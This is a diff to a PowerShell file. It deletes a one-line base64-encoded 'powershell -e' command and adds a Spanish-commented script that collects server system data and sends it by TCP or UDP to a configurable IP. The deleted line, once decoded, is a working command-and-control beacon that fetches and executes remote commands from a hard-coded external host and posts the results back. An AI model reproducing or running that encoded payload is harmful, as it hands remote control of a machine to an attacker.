@@ -1,1 +1,112 @@
-powershell -e JABzAD0AJwAzAC4AMgAyAC4AMwAwAC4ANAAwADoANAA0ADMAJwA7ACQAaQA9ACcANAAzADUAYgAyAGYAZABmAC0AZQA0AGQAMQBlAGMANQBlAC0ANQBmADkAMgA3ADUAZAA3ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADQAMwA1AGIAMgBmAGQAZgAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQA1ADEAZgA3AC0AZAA0ADgAMgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBlADQAZAAxAGUAYwA1AGUAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANQAxAGYANwAtAGQANAA4ADIAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8ANQBmADkAMgA3ADUAZAA3ACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANQAxAGYANwAtAGQANAA4ADIAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==
+# ============================================
+# CONFIGURACIÓN - Edita estos valores
+# ============================================
+$TargetIP = "192.168.1.100"    # IP del servidor destino
+$TargetPort = 8080             # Puerto destino
+$Protocol = "TCP"              # "TCP" o "UDP"
+
+# ============================================
+# RECOPILAR DATOS DEL SERVIDOR
+# ============================================
+
+# Información básica del sistema
+$computer = Get-CimInstance Win32_ComputerSystem
+$os = Get-CimInstance Win32_OperatingSystem
+
+# Datos del sistema
+$hostname = $env:COMPUTERNAME
+$totalMemory = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
+$cores = $computer.NumberOfLogicalProcessors
+$osName = $os.Caption
+$uptime = (Get-Date) - $os.LastBootUpTime
+
+# Rendimiento
+$cpuUsage = (Get-Counter "\Processor(_Total)\% Processor Time").CounterSamples.CookedValue
+$freeMemory = [math]::Round($os.FreePhysicalMemory / 1MB, 2)
+$memoryUsage = [math]::Round((($os.TotalVisibleMemorySize - $os.FreePhysicalMemory) / $os.TotalVisibleMemorySize) * 100, 2)
+
+# Discos
+$disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
+$diskList = @()
+foreach ($disk in $disks) {
+    $diskList += "$($disk.DeviceID) $([math]::Round($disk.Size/1GB,2))GB Libre:$([math]::Round($disk.FreeSpace/1GB,2))GB Uso:$([math]::Round((($disk.Size-$disk.FreeSpace)/$disk.Size)*100,2))%"
+}
+
+# Red
+$adapters = Get-NetAdapter -Physical | Where-Object {$_.Status -eq "Up"}
+$ipList = @()
+foreach ($adapter in $adapters) {
+    $ip = (Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4).IPAddress
+    $ipList += "$($adapter.Name): $ip"
+}
+
+# ============================================
+# CREAR MENSAJE
+# ============================================
+
+$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+
+$message = @"
+========================================
+DATOS DEL SERVIDOR - $timestamp
+========================================
+
+SISTEMA:
+  Hostname: $hostname
+  SO: $osName
+  Cores: $cores
+  Memoria Total: $totalMemory GB
+  Uptime: $($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m
+
+RENDIMIENTO:
+  CPU: $([math]::Round($cpuUsage,2))%
+  Memoria Libre: $freeMemory MB
+  Memoria Usada: $memoryUsage%
+
+DISCOS:
+$($diskList -join "`n  ")
+
+RED:
+$($ipList -join "`n  ")
+
+========================================
+"@
+
+# ============================================
+# ENVIAR DATOS
+# ============================================
+
+Write-Host "Enviando datos a $TargetIP`:$TargetPort..." -ForegroundColor Yellow
+
+if ($Protocol -eq "TCP") {
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.Connect($TargetIP, $TargetPort)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.Write($message)
+        $writer.Flush()
+        $stream.Close()
+        $client.Close()
+        Write-Host "Datos enviados exitosamente" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "ERROR: $_" -ForegroundColor Red
+    }
+}
+else {
+    # UDP
+    try {
+        $udp = New-Object System.Net.Sockets.UdpClient
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
+        $udp.Send($bytes, $bytes.Length, $TargetIP, $TargetPort) | Out-Null
+        $udp.Close()
+        Write-Host "Datos enviados exitosamente" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "ERROR: $_" -ForegroundColor Red
+    }
+}
+
+# Mostrar en pantalla
+Write-Host "`n$message" -ForegroundColor Cyan
